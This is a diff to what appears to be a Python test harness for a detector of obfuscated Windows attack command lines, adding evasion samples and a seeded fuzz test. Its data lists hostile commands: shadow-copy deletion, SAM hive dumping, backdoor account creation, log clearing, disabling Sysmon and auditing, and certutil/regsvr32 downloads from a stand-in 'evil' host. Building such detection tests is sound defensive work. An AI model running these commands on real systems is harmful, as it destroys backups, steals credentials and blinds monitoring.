@@ -15,6 +15,7 @@ catches unobfuscated commands catches nothing real.
 
 from __future__ import annotations
 
+import re
 import sys
 from pathlib import Path
 
@@ -44,6 +45,11 @@ EVASION_CORPUS = [
      "+[char]110 delete shadows", "T1490"),
     ("char array", "powershell.exe",
      "[char[]](118,115,115,97,100,109,105,110) delete shadows", "T1490"),
+    ("hex char arithmetic", "powershell.exe",
+     "[char]0x76+[char]0x73+[char]0x73+[char]0x61+[char]0x64+[char]0x6d"
+     "+[char]0x69+[char]0x6e delete shadows", "T1490"),
+    ("PowerShell format operator", "powershell.exe",
+     "(\"{0}{1}\" -f 'vssad','min') delete shadows /all", "T1490"),
     ("full-width unicode", "cmd.exe",
      "ｎｅｔ user hacker /add", "T1136.001"),
     ("zero-width joiner", "cmd.exe",
@@ -73,6 +79,11 @@ BENIGN_CONTROLS = [
     ("setup.exe", r'setup.exe /S /D=C:\Program Files\MyApp'),
     ("python.exe", r'python -c "print(\'hello\' + \'world\')"'),
     ("cmd.exe", r'findstr /C:"net user" audit_policy.txt'),
+    # Benign -f format strings: a variable arg is unresolvable (placeholder
+    # stays), and a long-literal format is cosmetic, not evasion — neither may
+    # be turned into a detection.
+    ("powershell.exe", 'Write-Host ("{0} files in {1}s" -f $count, $secs)'),
+    ("powershell.exe", '("{0}-{1}" -f "Production","WebServer") | Out-Host'),
 ]
 
 
@@ -93,6 +104,10 @@ def main() -> int:
            "net" in normalize_cmdline("[char]110+[char]101+[char]116").text)
     _check("char array",
            "net" in normalize_cmdline("[char[]](110,101,116)").text)
+    _check("hex char arithmetic",
+           "net" in normalize_cmdline("[char]0x6e+[char]0x65+[char]0x74").text)
+    _check("format operator",
+           "net" in normalize_cmdline("(\"{0}{1}\" -f 'ne','t')").text)
     _check("full-width unicode", "net" in normalize_cmdline("ｎｅｔ").text)
     _check("zero-width stripped", "net" in normalize_cmdline("n\u200be\u200bt").text)
     _check("env var", "cmd.exe" in normalize_cmdline("%COMSPEC%").text.lower())
@@ -196,6 +211,61 @@ def main() -> int:
            "(an admin does not caret-escape)",
            plain is not None and obf is not None
            and obf["severity"] == "high" and plain["severity"] == "medium")
+
+    print("\n[8] Randomized stacked-obfuscation fuzz (seeded, deterministic)")
+    # Hit real attacks with random STACKS of transforms the normalizer claims to
+    # defeat — caret, backtick, token-split quotes, hex-[char] per keyword, case,
+    # whitespace. Any evasion is a residual systemic gap. Seeded so it is a stable
+    # regression, not a flaky test.
+    import random as _random
+    _bn = lambda p: (p or "").replace("/", "\\").rsplit("\\", 1)[-1].lower()
+    _fuzz_mal = [
+        ("vssadmin.exe", "vssadmin delete shadows /all /quiet"),
+        ("reg.exe", r"reg save hklm\sam c:\sam.hive"),
+        ("net.exe", "net user backdoor P@ss /add"),
+        ("wevtutil.exe", "wevtutil cl Security"),
+        ("sc.exe", "sc delete SysmonDrv"),
+        ("auditpol.exe", "auditpol /set /category:* /success:disable"),
+        ("wmic.exe", "wmic shadowcopy delete /nointeractive"),
+        ("certutil.exe", "certutil -urlcache -f http://evil/a.exe a.exe"),
+        ("regsvr32.exe", "regsvr32 /s /n /u /i:https://evil/x.sct scrobj.dll"),
+        ("mpcmdrun.exe", "MpCmdRun.exe -DownloadFile -url http://evil/a.exe -path a.exe"),
+    ]
+
+    def _tok_tfs():
+        def caret(t):  return t[0] + "^" + t[1:] if len(t) > 3 and t.isalpha() else t
+        def tick(t):   return t[0] + "`" + t[1:] if len(t) > 3 and t.isalpha() else t
+        def quote(t):  return t[:2] + '""' + t[2:] if len(t) > 3 and t.isalpha() else t
+        def hexc(t):   return ("+".join(f"[char]0x{ord(c):02x}" for c in t)
+                               if len(t) > 3 and t.isalpha() else t)
+        ident = lambda t: t
+        return [caret, tick, quote, hexc, ident, ident]
+
+    def _fuzz_once(cmd, rng, tfs):
+        head, sep, tail = cmd.partition(" ")
+        out = []
+        for tk in tail.split(" "):
+            m = re.match(r"([A-Za-z]{4,})(.*)", tk)
+            if m and rng.random() < 0.7:
+                word, rest = m.group(1), m.group(2)
+                for _ in range(rng.randint(1, 2)):
+                    word = rng.choice(tfs)(word)
+                tk = word + rest
+            out.append(tk)
+        joined = " ".join(out)
+        return head + sep + (joined.replace(" ", "  ") if rng.random() < 0.3 else joined)
+
+    rng = _random.Random(1337)
+    tfs = _tok_tfs()
+    fuzz_total = fuzz_evaded = 0
+    for image, cmd in _fuzz_mal:
+        for _ in range(30):
+            obf = _fuzz_once(cmd, rng, tfs)
+            fuzz_total += 1
+            if classify_behavior(_bn(image), "cmd.exe", obf, image) is None:
+                fuzz_evaded += 1
+    _check(f"0 evasions across {fuzz_total} randomized stacked-obfuscation variants",
+           fuzz_evaded == 0)
 
     print("\n" + "=" * 60)
     if _FAILURES:
